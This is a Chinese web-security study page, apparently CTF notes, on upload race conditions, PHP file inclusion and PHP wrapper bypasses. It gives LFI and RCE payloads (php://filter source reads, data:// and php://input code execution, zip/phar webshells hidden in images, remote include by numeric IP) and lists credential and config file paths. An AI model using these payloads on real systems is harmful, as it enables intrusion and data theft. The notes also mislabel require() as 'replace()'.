<p>%<strong>00</strong>截断 与 <strong>0</strong>x<strong>00</strong>截断的区别？</p>
<p>● 地址上⾯⽂件命名的区别。</p>
<p>● %00上是建⽴在地址信息上的</p>
<p>● 0x00 ⽂件</p>
<p>● 操作⽅法基本⼀致。</p>
<p>%<strong>00</strong>截断 与 <strong>0</strong>x<strong>00</strong>截断的实战中的区别？</p>
<p>● 平时⼀定要多观察⼀下数据包，数据包中包含了很多参数，很多参数可以进⾏修改。</p>
</blockquote>
<h4 id="4）二次渲染-条件竞争"><a href="#4）二次渲染-条件竞争" class="headerlink" title="4）二次渲染+条件竞争"></a>4）二次渲染+条件竞争</h4><blockquote>
<p>⼆次渲染：就是根据⽤户上传的图⽚，新⽣成⼀个图⽚，将原始图⽚删除，将新图⽚添加到数据库中。<br>⽐如⼀些⽹站根据⽤户上传的头像⽣成⼤中⼩不同尺⼨的图像</p>
</blockquote>
<blockquote>
<p>条件竞争就是在，当二次渲染先把文件移动到储存目录后，才判断文件是否合法时<br>就产⽣了漏洞，会有⼀个短暂的时间将我们上传的webshell存储在⽬录下，且以我们上传的<br>⽂件名的形式</p>
<p>但是这个时间相当相当短暂，以⾄于，你打开上传⽬录，点击上传⽂件，你连影⼦都看不到就已经<br>没了，</p>
<p>所以这个时候我们可以使⽤burpsuite，我们先抓包，然后发送到intruder模块。<br>点击clear去除所有参数，然后payload选择⽆，并且选择持续发包。</p>
</blockquote>
<blockquote>
<p>⼆次渲染只能靠这个条件竞争去绕过么？<br>○ ⼆次渲染：说的是这个技术叫做⼆次渲染，不是说⼆次渲染有漏洞。<br>○ 有漏洞可利⽤的原因是因为，他是在⽂件上传之后才有的后续操作，第⼀步的时候已经将⽂件<br>上传到服务器上了。<br>○ 如果这个⼆次渲染在第⼀步之前，这个⼆次渲染是没有任何问题的。<br>○ ⼆次渲染不是漏洞，是⼀种技术，是⼀种逻辑上的验证，条件竞争。<br>○ 利⽤条件竞争，防⽌他第⼆步操作</p>
</blockquote>
<hr>
<h2 id="七、文件包含"><a href="#七、文件包含" class="headerlink" title="七、文件包含"></a>七、文件包含</h2><h3 id="1-文件包含的四个函数："><a href="#1-文件包含的四个函数：" class="headerlink" title="1.文件包含的四个函数："></a>1.文件包含的四个函数：</h3><p>1.include():将在其被调用的位置处包含一个文件。包含一个文件与在该语句所在位置复制制定文件的数据具有相同内容的效果。使用include()时可以忽略括号。</p>
<p>2.include_once():在脚本执行期间包含并运行指定文件。此行为和 include() 语句类似，<u><strong>唯一区别是include_once()会先判断一下这个文件在之前是否已经被包含过，如已经包含，则忽略本次包含。</strong></u></p>
<p>3.replace() :很大程度上与include相同，都是将一个模板文件包含到require调用坐在的位置。</p>
<p>require和include之间有两点重要的区别:</p>
<p>1.无论require的位置如何，制定文件都将包含到出现require的脚本中。例如，即使require放在计算结果为假的if语句中，依然会包含指定文件。<br>2.require出错时，脚本将停止运行，而在使用include的情况下，脚本将继续执行。</p>
<p>4.replace_once():在脚本执行期间包含并运行指定文件。此行为和 require() 语句类似，<u><strong>唯一区别是require_once()会先判断一下这个文件在之前是否已经被包含过，如已经包含，则忽略本次包含</strong></u></p>
<h4 id="require-once-多次包含"><a href="#require-once-多次包含" class="headerlink" title="*require_once()多次包含"></a><code>*require_once()</code>多次包含</h4><p><u><strong>下面是一篇关于<code>require_once被使用后不能再使用怎么绕开</code>的文章，本人在2022年5月Dest0g3二次招新比赛遇到类似，特此记录</strong></u></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235">php源码分析 require_once 绕过不能重复包含文件的限制</a></p>
</blockquote>
<blockquote>
<p><code>require_once()</code><br>在对软链接的操作上存在一些缺陷，软连接层数较多会使hash匹配直接失效造成重复包含，超过20次软链接后可以绕过，外加伪协议编码一下：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>var<span class="regexp">/www/</span>html/flag.php</span><br></pre></td></tr></table></figure>
</blockquote>
<p>下面该题代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="comment">//find something in flag1.php </span></span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]; </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$d</span>, FILTER_VALIDATE_URL)) &#123;   </span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$d</span>);   </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;lai&quot;</span>) !== <span class="literal">false</span> &amp;&amp;</span><br><span class="line">  <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;ya&quot;</span>) !== <span class="literal">false</span>)  &#123;       </span><br><span class="line">            @<span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);     </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;       </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Sorry, you can not pass&quot;</span>);     </span><br><span class="line">        &#125;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/labour$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;   </span><br><span class="line">                  @<span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$d</span>);       </span><br><span class="line">                  <span class="keyword">echo</span> (<span class="variable">$a</span>);     </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;                                      <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);     </span><br><span class="line">                                    &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;why?&quot;</span>);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid URL&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>文章关键：</strong></p>
<p><u><strong>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经<code>require_once(&#39;flag.php&#39;)</code>，已经include的文件不可以再require_once。</strong></u></p>
<p><u><strong>今天就来谈谈，怎么设想如何绕过这个哈希表，让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。</strong></u></p>
<p><u><strong>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过</strong></u></p>
<p>payload:</p>
<p>?d&#x3D;0:&#x2F;&#x2F;labour&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flll1ag2.txt&amp;ctf&#x3D;laiya</p>
<h3 id="2-php伪协议"><a href="#2-php伪协议" class="headerlink" title="2.php伪协议"></a>2.php伪协议</h3><p>内容来自于<a target="_blank" rel="noopener" href="https://blog.csdn.net/qz362228/article/details/124359070">https://blog.csdn.net/qz362228/article/details/124359070</a></p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803155611860.png"><img src="/Web-study/image-20230803155611860.png" alt="image-20230803155611860"></a></p>
<h4 id="1-php-协议"><a href="#1-php-协议" class="headerlink" title="1.php:&#x2F;&#x2F;协议"></a>1.php:&#x2F;&#x2F;协议</h4><p><strong>·条件：</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:<span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line">allow_url_include #仅php://<span class="keyword">input</span> php://stdin php://memory php://<span class="keyword">temp</span> 需要<span class="keyword">on</span></span><br></pre></td></tr></table></figure>

<p><strong>·作用：</strong></p>
<blockquote>
<p><code>php://</code> 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
</blockquote>
<p><strong>·说明</strong>：</p>
<blockquote>
<p>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器</p>
</blockquote>
<h4 id="2-php-filter伪协议"><a href="#2-php-filter伪协议" class="headerlink" title="2.php:&#x2F;&#x2F;filter伪协议"></a>2.php:&#x2F;&#x2F;filter伪协议</h4><p><strong>·条件</strong></p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>只是<code>读取</code>，需要开启<code>allow_url_fopen</code>，不需要开启<code>allow_url_include</code></p>
</blockquote>
<p><strong>·说明：</strong></p>
<blockquote>
<p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写<br>①输出进行<code>base64</code>加密后的信息</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=xx.php</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=xx.php</span><br></pre></td></tr></table></figure>

<p>②获得将base64加密后的信息后，再将其解密，得出原信息</p>
</blockquote>
<h5 id="绕过base过滤"><a href="#绕过base过滤" class="headerlink" title="绕过base过滤"></a>绕过base过滤</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/string.rot13/</span>resource=flag.php</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。</p>
</blockquote>
<h5 id="绕过对参数限制"><a href="#绕过对参数限制" class="headerlink" title="绕过对参数限制"></a>绕过对参数限制</h5><p>比如</p>
<blockquote>
<p>preg_match(“&#x2F;NewStar&#x2F;i”,$_GET[‘file’])</p>
</blockquote>
<p>php:&#x2F;&#x2F;filter协议在&#x2F; 后面可以添加任意字符,不会影响结果的输出，如下，将字符串加入到resource前面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/string.rot13/NewStar/resource=</span></span><br></pre></td></tr></table></figure>



<h4 id="3-php-input（读取POST数据）"><a href="#3-php-input（读取POST数据）" class="headerlink" title="3.php:&#x2F;&#x2F;input（读取POST数据）"></a>3.php:&#x2F;&#x2F;input（读取POST数据）</h4><p><strong>·条件</strong></p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span></span><br></pre></td></tr></table></figure>

<p><strong>·说明</strong></p>
<blockquote>
<p>可以访问请求的原始数据的只读流。在post请求中能查看请求的原始数据，<u><strong>并将post请求中的post数据当作php代码执行</strong></u>。（只读流是说只能进行读操作的数据）</p>
</blockquote>
<p><code>例如</code></p>
<p>下面的POST数据里的命令就会被执行</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220801143739625.png"><img src="/Web-study/image-20220801143739625.png" alt="image-20220801143739625"></a></p>
<blockquote>
<p>即可以<u>直接读取到POST上</u>没有经过解析的原始数据。 <strong>enctype&#x3D;”multipart&#x2F;form-data”</strong> 的时候 php:&#x2F;&#x2F;input 是<strong>无效</strong>的</p>
</blockquote>
<p><code>注</code> ：</p>
<blockquote>
<p>查看当前运行的是哪个php.ini<br>2,3需要将php可执行加入环境变量, 如果没有加,那么请使用php可执行文件所在位置的完整路径代替</p>
</blockquote>
<blockquote>
<ol>
<li></li>
</ol>
<p>打印出<code>phpinfo();</code> 找到<code>Loaded Configuration File</code>那一行</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803154754765.png"><img src="/Web-study/image-20230803154754765.png" alt="image-20230803154754765"></a></p>
<blockquote>
<ol start="2">
<li></li>
</ol>
<p>命令行输入</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">php</span> -<span class="variable">i</span> |<span class="variable">grep</span> <span class="variable">php.ini</span>（<span class="variable">php</span> -<span class="variable">i</span>其实就是输出<span class="function"><span class="title">phpinfo</span>();)</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r “phpinfo();” <span class="string">|grep php.ini</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="4-file-伪协议（读取文件内容）"><a href="#4-file-伪协议（读取文件内容）" class="headerlink" title="4.file:&#x2F;&#x2F;伪协议（读取文件内容）"></a>4.file:&#x2F;&#x2F;伪协议（读取文件内容）</h4><p>   <strong>·条件</strong></p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span>/<span class="literal">off</span> （均不受影响）</span><br></pre></td></tr></table></figure>

<p>打<code>ctf</code>中常用于读取本地文件</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">file</span>:<span class="comment">//C:\Windows\System32\drivers\etc\hosts</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803154806812.png"><img src="/Web-study/image-20230803154806812.png" alt="image-20230803154806812"></a></p>
<h4 id="5-phar-伪协议-读取压缩包文件内容"><a href="#5-phar-伪协议-读取压缩包文件内容" class="headerlink" title="5.phar:&#x2F;&#x2F;伪协议(读取压缩包文件内容)"></a>5.phar:&#x2F;&#x2F;伪协议(读取压缩包文件内容)</h4><p><strong>·条件</strong></p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">allow_url_fopen:</span> <span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line"><span class="symbol">allow_url_include:</span> <span class="keyword">off</span>/<span class="keyword">on</span> (均不受影响)</span><br></pre></td></tr></table></figure>

<p><code>注</code>：</p>
<blockquote>
<p>php 版本大于等于<code>5.3.0</code>，压缩包需要是<code>zip</code>协议压缩，<code>rar</code>不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。</p>
</blockquote>
<p><strong>·格式</strong></p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=phar:<span class="comment">//压缩包名/内部文件名</span></span><br></pre></td></tr></table></figure>

<p>例，</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">phar:</span><span class="comment">//x.zip/x.php</span></span><br></pre></td></tr></table></figure>

<h4 id="6-zip-伪协议"><a href="#6-zip-伪协议" class="headerlink" title="6.zip:&#x2F;&#x2F;伪协议"></a>6.zip:&#x2F;&#x2F;伪协议</h4><blockquote>
<p>zip伪协议和phar协议类似，但是用法不一样（url不同）</p>
</blockquote>
<p><strong>·条件</strong></p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">allow_url_fopen:</span> <span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line"><span class="symbol">allow_url_include:</span> <span class="keyword">off</span>/<span class="keyword">on</span> (均不受影响)</span><br></pre></td></tr></table></figure>

<p><strong>·格式</strong></p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">zip</span>:<span class="comment">//[压缩文件绝对路径]#[压缩文件内的子文件名]</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意</strong>：#[压缩文件内的子文件名]是指文件名不包含后缀，如下面shell.php，只写shell</p>
</blockquote>
<p>例，</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">zip:</span>//D:\phpstudy\WWW\<span class="keyword">x</span>.zip<span class="variable">%23</span>shell       #-&gt;<span class="variable">%23</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果限制了上传只能其他格式，比如png图片等等，也可用zip:&#x2F;&#x2F;，将一个一句话木马【cmd.php】加入到一个压缩包里面【cmd.zip】，然后重命名后缀名.zip改成.png，</p>
<p>然后根据上传的路径和图片名字，访问，</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=zip:<span class="regexp">//</span>.<span class="regexp">/assets/img</span><span class="regexp">/upload/</span>xxxx.png%<span class="number">23</span>cmd</span><br></pre></td></tr></table></figure>


</blockquote>
<h4 id="7-data-伪协议-读取文件"><a href="#7-data-伪协议-读取文件" class="headerlink" title="7.data:&#x2F;&#x2F;伪协议(读取文件)"></a>7.data:&#x2F;&#x2F;伪协议(读取文件)</h4><blockquote>
<p>（可以直接达到执行php代码的效果）<br>和<code>php://input</code>很像，<code>php://input</code>以<code>post</code>提交数据那样提交数据，<br><code>data://</code>是以<code>get</code>方式提交数据，也是可以执行提交的脚本</p>
</blockquote>
<p><strong>·格式</strong></p>
<blockquote>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?file=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo()<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>如果对特殊字符进行了过滤，可以通过base64编码后再输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;<span class="built_in">base64</span>,<span class="built_in">base64</span>加密的代码</span><br></pre></td></tr></table></figure>

<p>可配合<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/7831529.html">php命令执行漏洞</a>，实现对一些数据的获取<br>如：<code>&lt;?php system(&quot;ls&quot;)?&gt;</code></p>
</blockquote>
<h4 id="8-总结"><a href="#8-总结" class="headerlink" title="8.总结"></a>8.总结</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dreamthe/article/details/121765876">参考实例1</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41617034/article/details/106658417">参考实例2</a></p>
</blockquote>
<h3 id="3-绕过"><a href="#3-绕过" class="headerlink" title="3.绕过"></a>3.绕过</h3><h4 id="1）路径长度绕过后缀"><a href="#1）路径长度绕过后缀" class="headerlink" title="1）路径长度绕过后缀"></a>1）路径长度绕过后缀</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=@$_GET[<span class="string">&#x27;123&#x27;</span>];</span><br><span class="line"><span class="title function_">include</span>($a.<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>如果限制了文件类型，比如这里只能包含<code>html</code>后缀的文件，那么就可以使用此方法</p>
<p><code>操作系统存在最大路径长度的限制</code></p>
<blockquote>
<p>windows系统，文件名最长256个字符</p>
<p>linux系统，文件名最长4096个字符(浏览器最多只能输入300多个字符，所以需要抓包)<br>前面加.&#x2F;.&#x2F;.&#x2F;.&#x2F;…………xx.php</p>
</blockquote>
<p>可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，<code>导致扩展名被中途截断</code></p>
<p>在文件后面加<code>.</code> 如： </p>
<blockquote>
<p>info.php………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………….html</p>
<p><code>.</code>超过256个就行，后面多出来的<code>...........................................html</code>不会被识别到</p>
</blockquote>
<h4 id="2）-截断后缀"><a href="#2）-截断后缀" class="headerlink" title="2）? 截断后缀"></a>2）? 截断后缀</h4><p>往往文件包含中会出现</p>
<blockquote>
<p><code>(&quot;$file&quot;.&quot;.html&quot;)</code><br>这里以html为例子，这样我们输入的文件名称参数后面终会跟上.html后缀，从而导致文件包含失败</p>
<p>要截断后缀，只需要在末尾添加 <code>?</code> 即可，这样后缀就会变成 URL 的参数</p>
</blockquote>
<h4 id="3）-点被过滤，网址-IP无法输入"><a href="#3）-点被过滤，网址-IP无法输入" class="headerlink" title="3）.点被过滤，网址&#x2F;IP无法输入"></a>3）<code>.</code>点被过滤，网址&#x2F;IP无法输入</h4><p>ip转长整型,里面有一句话木马,需要vps</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.bejson.com/convert/ip2int/">https://www.bejson.com/convert/ip2int/</a></p>
</blockquote>
<p>如将IP地址219.239.110.138转换为数字：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">219</span> * <span class="number">256</span>^<span class="number">3</span> + <span class="number">239</span> * <span class="number">256</span>^<span class="number">2</span> + <span class="number">110</span> * <span class="number">256</span>^<span class="number">1</span> + <span class="number">138</span> * <span class="number">256</span>^<span class="number">0</span> = <span class="number">3689901706</span></span><br></pre></td></tr></table></figure>

<p>因此，219.239.110.138的数字地址为3689901706。</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include <span class="string">&quot;http://3689901706&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h4 id="4）-被过滤"><a href="#4）-被过滤" class="headerlink" title="4）;被过滤"></a>4）;被过滤</h4><p>?&gt;闭合代码</p>
<p>因为?&gt;可以代替php代码中最后一个分号的作用</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803165104978.png"><img src="/Web-study/image-20230803165104978.png" alt="image-20230803165104978"></a></p>
<h4 id="5）强制加后缀"><a href="#5）强制加后缀" class="headerlink" title="5）强制加后缀"></a>5）强制加后缀</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">如 include($cmd.&quot;.php&quot;)</span></span><br><span class="line"><span class="language-xml">$cmd=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>()<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">// 后面再拼接上.php的时候，由于php语句已经闭合，所以起不了什么作用</span></span><br></pre></td></tr></table></figure>

<h4 id="6）路径过滤"><a href="#6）路径过滤" class="headerlink" title="6）路径过滤"></a>6）路径过滤</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如replace(<span class="string">&#x27;./&#x27;</span>,<span class="string">&#x27;&#x27;</span>) ==&gt;</span><br><span class="line">可以用 ...<span class="regexp">//</span>...<span class="regexp">//</span>...<span class="regexp">//</span>...<span class="regexp">//</span>...<span class="regexp">//</span>flag</span><br></pre></td></tr></table></figure>

<h3 id="4-敏感文件路径"><a href="#4-敏感文件路径" class="headerlink" title="4.敏感文件路径"></a>4.敏感文件路径</h3><h5 id="读取网站配置文件"><a href="#读取网站配置文件" class="headerlink" title="读取网站配置文件"></a>读取网站配置文件</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dedecms 数据库配置文件 data/common<span class="selector-class">.inc</span><span class="selector-class">.php</span>,</span><br><span class="line">discuz 全局配置文件 config/config_global<span class="selector-class">.php</span>,</span><br><span class="line">phpcms 配置文件 caches/configs/database<span class="selector-class">.php</span></span><br><span class="line">phpwind 配置文件 conf/database<span class="selector-class">.php</span></span><br><span class="line">wordpress 配置文件 wp-config.php</span><br></pre></td></tr></table></figure>

<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">C:</span>/boot.ini<span class="comment">//查看系统版本</span></span><br><span class="line"><span class="symbol">C:</span>/Windows/System32<span class="keyword">/inetsrv/</span>MetaBase.xml<span class="comment">//IIS 配置文件</span></span><br><span class="line"><span class="symbol">C:</span>/Windows<span class="keyword">/repairsam/</span>/存储系统初次安装的密码</span><br><span class="line"><span class="symbol">C:</span>/Program Files<span class="keyword">/mysql/</span>my.ini<span class="comment">//Mysql 配置</span></span><br><span class="line"><span class="symbol">C:</span>/Program Files<span class="keyword">/mysql/</span>data<span class="keyword">/mysql/</span>user.MYD<span class="comment">//Mysql   root</span></span><br><span class="line"><span class="symbol">C:</span>/Windows/php.ini<span class="comment">//php 配置信息</span></span><br><span class="line"><span class="symbol">C:</span>/Windows/my.ini<span class="comment">//Mysql 配置信息</span></span><br></pre></td></tr></table></figure>

<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/proc/</span>self<span class="regexp">/cwd/</span> <span class="comment">#指向当前目录</span></span><br><span class="line"><span class="regexp">/proc/</span>self/root <span class="comment">#指向根目录</span></span><br><span class="line"><span class="regexp">/proc/m</span>aps    <span class="comment">#记录一些调用的拓展或者自定义的so文件</span></span><br><span class="line"><span class="regexp">/proc/</span>self/environ <span class="comment">#环境变量</span></span><br><span class="line"><span class="regexp">/proc/</span>environ  <span class="comment">#环境变量</span></span><br><span class="line"><span class="regexp">/proc/</span>comm    <span class="comment">#当前进程运行的程序</span></span><br><span class="line"><span class="regexp">/proc/</span>cmdline <span 